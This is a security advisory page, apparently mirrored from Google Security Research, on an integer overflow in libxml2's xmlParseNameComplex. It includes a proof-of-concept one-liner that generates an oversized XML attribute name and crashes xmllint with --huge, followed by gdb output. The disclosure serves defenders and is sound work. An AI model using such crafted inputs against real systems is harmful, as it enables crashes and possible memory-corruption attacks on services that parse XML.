---
title: libxml2 xmlParseNameComplex Integer Overflow
url: https://cxsecurity.com/issue/WLB-2022110019
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-16
fetch_date: 2025-10-03T22:50:53.378158
---

# libxml2 xmlParseNameComplex Integer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **libxml2 xmlParseNameComplex Integer Overflow** **2022.11.15**  Credit:  **[Google Security Research](https://cxsecurity.com/author/Google%2BSecurity%2BResearch/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2022-29824](https://cxsecurity.com/cveshow/CVE-2022-29824/ "Click to see CVE-2022-29824")** | **[CVE-2022-40303](https://cxsecurity.com/cveshow/CVE-2022-40303/ "Click to see CVE-2022-40303")**  CWE: **[CWE-189](https://cxsecurity.com/cwe/CWE-189 "Click to see CWE-189")** | |

libxml2: Integer overflow in xmlParseNameComplex
libxml2 is vulnerable to an integer overflow in `xmlParseNameComplex` when an attribute list has a very long name (name is >= 2\*\*32 characters).
```
static const xmlChar \*xmlParseNameComplex(xmlParserCtxtPtr ctxt) {
int len = 0, l;
[...]
return (xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
}
```
If the name is greater than or equal to 2\*\*32 characters, then `len` overflows. The calculation for the second argument to xmlDictLookup (`ctxt->input->cur - len`) will point to an address outside of the buffer such as adding 0x80000000 to `cur`.
Exploiting this issue using static XML requires that the `XML\_PARSE\_HUGE` flag is used to disable hardcoded parser limits. Though similar to Felix’s report [\(CVE-2022-29824\)](https://gitlab.gnome.org/GNOME/libxml2/-/issues/351) it may be possible to trigger without the flag using XSLT or xpath though I didn’t look into this.
\_Note: XML\_PARSE\_HUGE looks very brittle in general. Signed 32-bit integers are widely used as sizes/offsets throughout the codebase, a lot of the helper functions don’t handle inputs larger than 4GB correctly and fuzzers won’t trigger these edge cases. Maybe that flag should include a security warning? Some security critical projects like xmlsec enable it by default (https://github.com/lsh123/xmlsec/commit/3786af10953630cd2bb2b57ce31c575f025048a8) which seems risky.\_
Proof of Concept:
```
$ python3 -c 'print("<!DOCTYPE doc [\n<!ATTLIST src " + "a"\*(0x80000000) + " IDREF #IMPLIED>")' > name\_big.xml
$ ./xmllint --huge /tmp/name\_big.xml
Program received signal SIGSEGV, Segmentation fault.
\_\_strlen\_evex () at ../sysdeps/x86\_64/multiarch/strlen-evex.S:77
77 ../sysdeps/x86\_64/multiarch/strlen-evex.S: No such file or directory.
(gdb) bt
#0 \_\_strlen\_evex () at ../sysdeps/x86\_64/multiarch/strlen-evex.S:77
#1 0x00007ffff7e3a374 in xmlDictLookup (dict=0x421a50, name=0x7ffff795602e <error: Cannot access memory at address 0x7ffff795602e>, len=-2147483648)
at /usr/local/google/home/maddiestone/libxml2/dict.c:878
#2 0x00007ffff7e6607a in xmlParseNameComplex (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3617
#3 0x00007ffff7e65395 in xmlParseName (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3682
#4 0x00007ffff7e6f27e in xmlParseAttributeListDecl (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:6729
#5 0x00007ffff7e71a00 in xmlParseMarkupDecl (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:7754
#6 0x00007ffff7e79ed1 in xmlParseInternalSubset (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:9407
#7 0x00007ffff7e79a16 in xmlParseDocument (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:12165
#8 0x00007ffff7e819fe in xmlDoRead (ctxt=0x421750, URL=0x0, encoding=0x0, options=4784128, reuse=0)
at /usr/local/google/home/maddiestone/libxml2/parser.c:17044
#9 0x00007ffff7e81ad7 in xmlReadFile (filename=0x7fffffffdec7 "../qname\_big.xml", encoding=0x0, options=4784128)
at /usr/local/google/home/maddiestone/libxml2/parser.c:17109
#10 0x000000000040a135 in parseAndPrintFile (filename=0x7fffffffdec7 "../qname\_big.xml", rectxt=0x0)
at /usr/local/google/home/maddiestone/libxml2/xmllint.c:2366
#11 0x0000000000407574 in main (argc=3, argv=0x7fffffffdac8) at /usr/local/google/home/maddiestone/libxml2/xmllint.c:3757
(gdb) up
#1 0x00007ffff7e3a374 in xmlDictLookup (dict=0x421a50, name=0x7ffff795602e <error: Cannot access memory at address 0x7ffff795602e>, len=-2147483648)
at /usr/local/google/home/maddiestone/libxml2/dict.c:878
878 l = strlen((const char \*) name);
(gdb) up
#2 0x00007ffff7e6607a in xmlParseNameComplex (ctxt=0x421750) at /usr/local/google/home/maddiestone/libxml2/parser.c:3617
3617 return (xmlDictLookup(ctxt->dict, ctxt->input->cur - len, len));
(gdb) p/x len
$5 = 0x80000000
(gdb) p/x $\_siginfo
$6 = {si\_signo = 0xb, si\_errno = 0x0, si\_code = 0x1, \_sifields = {\_pad = {0xf795602e, 0x7fff, 0x0 <repeats 26 times>}, \_kill = {si\_pid = 0xf795602e,
si\_uid = 0x7fff}, \_timer = {si\_tid = 0xf795602e, si\_overrun = 0x7fff, si\_sigval = {sival\_int = 0x0, sival\_ptr = 0x0}}, \_rt = {si\_pid = 0xf795602e,
si\_uid = 0x7fff, si\_sigval = {sival\_int = 0x0, sival\_ptr = 0x0}}, \_sigchld = {si\_pid = 0xf795602e, si\_uid = 0x7fff, si\_status = 0x0, si\_utime = 0x0,
si\_stime = 0x0}, \_sigfault = {si\_addr = 0x7ffff795602e, \_addr\_lsb = 0x0, \_addr\_bnd = {\_lower = 0x0, \_upper = 0x0}}, \_sigpoll = {
si\_band = 0x7ffff795602e, si\_fd = 0x0}}}
(gdb) p/x ctxt->input->cur
$7 = 0x7fff7795602e
```
Related CVE Numbers: CVE-2022-29824,CVE-2022-40303.
Found by: Google Security Research

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110019)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top